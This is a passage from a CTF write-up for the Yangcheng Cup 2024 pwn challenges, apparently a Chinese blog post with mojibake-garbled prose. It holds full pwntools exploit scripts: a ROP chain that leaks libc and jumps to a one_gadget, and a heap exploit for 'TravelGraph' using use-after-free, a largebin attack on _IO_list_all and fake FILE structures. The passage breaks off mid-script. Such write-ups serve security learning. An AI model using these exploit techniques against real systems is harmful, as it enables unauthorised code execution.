class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">31213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601500</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(ret)+p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ogg)):</span><br><span class="line">    ogg[i] += libc_base</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601700</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_r13 = <span class="number">0x0000000000041c4a</span> + libc_base</span><br><span class="line">pop_r12 = <span class="number">0x0000000000035731</span> + libc_base</span><br><span class="line">pop_rbp = <span class="number">0x000000000002a2e0</span> + libc_base</span><br><span class="line">execve = libc.symbols[<span class="string">&#x27;execve&#x27;</span>] + libc_base</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rbp)+p64(<span class="number">0x601780</span>)+p64(ogg[<span class="number">5</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><p>è¿™æ˜¯æœ¬æ¬¡æ¯”èµ›å”¯ä¸€çš„å †é£æ°´é¢˜ï¼Œå…¶é¢˜ç›®å¤§æ¦‚çš„æ„æ€æ˜¯è®©æˆ‘ä»¬è¾“å…¥è·¯å¾„ï¼Œç„¶åæœ‰ä¸ªå‡½æ•°å«<code>Dijkstra</code>ç”¨æ¥è®¡ç®—æœ€çŸ­è·¯åŠ²ï¼Œè¿™é‡Œå…ˆçœ‹å †å—æ˜¯ç”³è¯·çš„</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§å †å—çš„å¤§å°å’Œæˆ‘ä»¬é€‰ç”¨çš„äº¤é€šå·¥å…·æœ‰å…³ç³»ï¼Œèƒ½ç”³è¯·çš„å †å—å¤§å°æœ‰<code>0x520/0x530/0x540</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>freeå‡½æ•°ä¸­å­˜åœ¨ååˆ†æ˜æ˜¾çš„<code>UAF</code>æ¼æ´</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>editå‡½æ•°åªèƒ½å¤Ÿä½¿ç”¨ä¸€æ¬¡ï¼Œè€Œä¸”åœ¨ä½¿ç”¨å‰éœ€è¦æ»¡è¶³<code>edit_flag2</code>å˜é‡çš„å€¼ä¸º<code>true</code>ï¼Œè¿™ä¸ªå˜é‡çš„å€¼å¯ä»¥é€šè¿‡<code>Dijkstra</code>å‡½æ•°è®¡ç®—å½“å‰åŸå¸‚è·ç¦»<code>guangzhou</code>çš„è·ç¦»æ˜¯å¦å¤§äº<code>2000</code>æ¥æ”¹å˜</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥ç”±äºaddå‡½æ•°å¯¹è·¯å¾„çš„é•¿åº¦æœ‰é™åˆ¶ï¼Œæ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæ¡ä»¶æ˜¯æ— æ³•æ»¡è¶³çš„<br>æ±‚è§£æ€è·¯ä¸ºåˆ©ç”¨å †é£æ°´åˆç†æ„é€ å †å—è·å–ä¸€æ¬¡<code>edit</code>æœºä¼šï¼Œç„¶å<code>largebin attack</code>æ‰“<code>_IO_list_all</code>ã€‚ç”±äºè¿™é‡Œå¼€å¯äº†æ²™ç®±ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>orw</code>è¯»å‡ºflagã€‚è¿™é¢˜çš„æ ˆåœ°å€è¿œç¨‹å’Œæœ¬åœ°æœ‰ <code>8</code> å­—èŠ‚çš„åå·®ï¼Œé€†å¤©<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34146</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">citys = [<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="string">b&#x27;fuzhou&#x27;</span>]</span><br><span class="line">trans = [<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;plane&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;distance.&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">tran,froms,tos,far,note</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;What kind of transportation do you want? car/train/plane?&#x27;</span>)</span><br><span class="line">    p.sendline(trans[tran])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(far))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">djsk</span>(<span class="params">froms</span>):</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>),</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">8888</span>)+p32(<span class="number">2</span>)) <span class="comment"># 4</span></span><br><span class="line">djsk(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1461</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">large = libc_base + <span class="number">0x21b110</span></span><br><span class="line">heap = heap_base + <span class="number">0x2930</span></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Which one do you want to change?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">target = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target - <span class="number">0x100</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: target-<span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p64(large)*<span class="number">2</span>+p64(target-<span class="number">0x100</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>)+fake_io_read[<span class="number">0x30</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">meau(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span 